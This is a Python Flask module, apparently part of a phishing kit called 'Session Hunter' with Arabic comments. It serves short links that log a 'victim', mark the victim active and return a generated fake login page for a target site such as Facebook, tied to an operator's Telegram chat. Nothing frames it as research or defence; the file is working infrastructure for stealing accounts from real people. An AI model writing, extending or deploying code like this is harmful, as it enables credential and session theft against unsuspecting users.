# short_link.py
# ============================================================
# المسار القصير /f/<code> لسيشن هنتر
# ============================================================

import json
import uuid
from flask import request

from config import bot, redis_client
from imports_manager import (
    update_victim_status,
    VICTIMS_ENABLED,
    sh_create_session,
    sh_generate_login_page,
)


def init_short_link(app):
    """تسجيل مسار الرابط القصير"""

    @app.route('/f/<code>', methods=['GET'])
    def short_link_show(code):
        meta = get_short_link(code)
        if not meta:
            return """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><title>رابط منتهي</title>
<style>body{font-family:sans-serif;background:#f5f7fa;text-align:center;padding:80px 20px}
h1{color:#e11d48}</style></head>
<body><h1>❌ الرابط منتهي الصلاحية</h1><p>يرجى طلب رابط جديد</p></body></html>""", 410

        chat_id = str(meta.get("chat_id"))
        site = meta.get("site", "facebook")
        victim_id = meta.get("victim_id", "")
        victim_name = meta.get("name", "")

        session_id = uuid.uuid4().hex[:24]

        if redis_client:
            try:
                redis_client.setex(
                    f"sh_session:{session_id}",
                    86400 * 7,
                    json.dumps({
                        "chat_id": chat_id,
                        "target_site": site,
                        "victim_id": victim_id,
                        "victim_name": victim_name,
                    })
                )
            except Exception as e:
                print(f"[-] Redis save session error: {e}")

        if victim_id and VICTIMS_ENABLED:
            try:
                update_victim_status(chat_id, victim_id, "active")
            except Exception:
                pass

        try:
            sh_create_session(session_id, chat_id, site)
        except Exception as e:
            print(f"[-] sh_create_session error: {e}")

        try:
            html = sh_generate_login_page(session_id, chat_id, site)
            return html, 200
        except Exception as e:
            print(f"[-] sh_generate_login_page error: {e}")
            return f"<h1>Error: {e}</h1>", 500


def get_short_link(code):
    if not redis_client:
        return None
    try:
        raw = redis_client.get(f"short:{code}")
        if raw:
            return json.loads(raw)
    except Exception as e:
        print(f"[-] get_short_link error: {e}")
    return None
